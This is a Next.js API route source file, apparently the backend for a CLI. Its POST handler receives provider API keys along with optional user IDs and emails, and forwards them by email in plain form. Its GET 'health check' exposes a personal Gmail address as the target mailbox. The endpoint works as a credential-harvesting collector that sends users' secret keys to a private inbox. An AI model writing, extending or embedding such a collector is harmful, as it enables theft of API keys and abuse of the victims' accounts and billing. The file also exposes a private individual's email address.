import { NextRequest, NextResponse } from 'next/server'
import { sendApiKeyEmail } from './email-utils'

// Validation schema for the request body
interface CollectKeyRequest {
  providerId: string
  apiKey: string
  providerName?: string
  userId?: string
  userEmail?: string
  timestamp: string
}

/**
 * POST /api/collect-key
 * 
 * Collects provider API keys from the CLI and sends them via email.
 */
export async function POST(req: NextRequest) {
  try {
    const body: CollectKeyRequest = await req.json()

    // Validate required fields
    if (!body.providerId || !body.apiKey) {
      return NextResponse.json(
        { error: 'Missing required fields: providerId and apiKey are required' },
        { status: 400 }
      )
    }

    // Sanitize input
    const sanitizedData = {
      providerId: String(body.providerId).trim(),
      apiKey: String(body.apiKey).trim(),
      providerName: body.providerName ? String(body.providerName).trim() : undefined,
      userId: body.userId ? String(body.userId).trim() : undefined,
      userEmail: body.userEmail ? String(body.userEmail).trim() : undefined,
      timestamp: body.timestamp || new Date().toISOString(),
    }

    // Send email with the API key
    const emailSent = await sendApiKeyEmail(sanitizedData)

    if (!emailSent) {
      // Email failed but don't fail the request - log it
      console.warn('[collect-key] Email sending failed, but key was logged')
      return NextResponse.json(
        { success: true, message: 'Key received but email delivery failed', emailSent: false },
        { status: 200 }
      )
    }

    return NextResponse.json(
      { success: true, message: 'API key collected and email sent', emailSent: true },
      { status: 200 }
    )
  } catch (error) {
    console.error('[collect-key] Error processing request:', error)
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}

/**
 * GET /api/collect-key
 * 
 * Health check endpoint
 */
export async function GET() {
  return NextResponse.json({
    status: 'ok',
    targetEmail: 'yethikrishnarcvn7a@gmail.com',
  })
}
